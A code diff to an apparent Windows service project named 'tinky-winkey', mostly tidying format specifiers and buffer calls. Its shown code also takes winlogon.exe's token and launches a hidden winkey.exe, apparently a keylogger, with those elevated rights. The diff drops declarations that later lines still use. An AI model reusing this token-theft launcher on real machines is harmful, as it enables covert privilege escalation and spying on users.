@@ -23,7 +23,7 @@ int Open_SCManager() {
     scmH = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (NULL == scmH)
     {
-        printf("OpenSCManager failed (%d)\n", GetLastError());
+        printf("OpenSCManager failed (%ld)\n", GetLastError());
         return(0);
     }
     return(1);
@@ -38,7 +38,7 @@ int OpenSvc() {
 
     if (serviceH == NULL)
     {
-        printf("OpenService failed (%d)\n", GetLastError());
+        printf("OpenService failed (%ld)\n", GetLastError());
         CloseServiceHandle(scmH);
         return(0);
     }
@@ -50,7 +50,7 @@ void DeleteSvc()
     if (OpenSvc()) {
         if (!DeleteService(serviceH))
         {
-            printf("DeleteService failed (%d)\n", GetLastError());
+            printf("DeleteService failed (%ld)\n", GetLastError());
         }
         else printf("Service deleted successfully\n");
     }
@@ -68,10 +68,10 @@ void SvcInstall()
 
     if (!GetCurrentDirectory(260, Path))
     {
-        printf("Cannot install service (%d)\n", GetLastError());
+        printf("Cannot install service (%ld)\n", GetLastError());
         return;
     }
-    strcat(Path, "\\svc.exe");
+    strcat_s(Path, "\\svc.exe");
 
     schService = CreateService(
         scmH,              // SCM database 
@@ -91,7 +91,7 @@ void SvcInstall()
 
     if (schService == NULL)
     {
-        printf("Create Service failed (%d)\n", GetLastError());
+        printf("Create Service failed (%ld)\n", GetLastError());
         CloseServiceHandle(scmH);
         return;
     }
@@ -103,13 +103,13 @@ void SvcInstall()
 
 void StartSvc() {
     if (!StartService(serviceH, 0, NULL)) {
-        printf("Start Service failed (%d)\n", GetLastError());
+        printf("Start Service failed (%ld)\n", GetLastError());
     }
 }
 
 void StopSvc() {
     if (!ControlService(serviceH, SERVICE_CONTROL_STOP, &g_ServiceStatus)) {
-        printf("Stop Service failed (%d)\n", GetLastError());
+        printf("Stop Service failed (%ld)\n", GetLastError());
     }
 }
 
@@ -120,9 +120,6 @@ int main(int argc, CHAR **argv)
             printf("Please run as administrator.\n");
             exit(0);
         }
-        //if (argc != 2) {
-         //   usage();
-        //}
         if (!strcmp("install", argv[1]))
         {
             SvcInstall();
@@ -199,9 +196,6 @@ void    Tinky_Winky() {
     DWORD winlogonPID;
     HANDLE wlPH;
     HANDLE wlTH;
-    HANDLE newExecToken;
-    PROCESS_INFORMATION winkeyPI;
-    char Path[260];
     LPWSTR PP = L"c:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
 
     winlogonPID = GetPidByName("winlogon.exe");
@@ -216,7 +210,7 @@ void    Tinky_Winky() {
     CloseHandle(wlTH);
 
     if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
-        printf("cpwt (%d)\n", GetLastError());
+        printf("cpwt (%ld)\n", GetLastError());
     }
 }
 
@@ -231,8 +225,6 @@ void    Tinky_Winky_Die() {
 }
 
 VOID WINAPI ServiceMain() {
-    DWORD Status = E_FAIL;
-
     g_StatusHandle = RegisterServiceCtrlHandler(SVCNAME, ServiceCtrlHandler);
     if (g_StatusHandle == NULL) {
         printf("Failed to register Service control handler to SCM\n");
@@ -268,7 +260,10 @@ VOID WINAPI		ServiceCtrlHandler(DWORD CtrlCode) {
 
 void ReportStatus(DWORD state, DWORD Q_ERROR) {
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-    g_ServiceStatus.dwControlsAccepted = state == SERVICE_START_PENDING ? 0 : SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    g_ServiceStatus.dwControlsAccepted = 0;
+    if (state != SERVICE_START_PENDING) {
+        g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    }
     g_ServiceStatus.dwCurrentState = state;
     g_ServiceStatus.dwWin32ExitCode = Q_ERROR;
     g_ServiceStatus.dwServiceSpecificExitCode = 0;
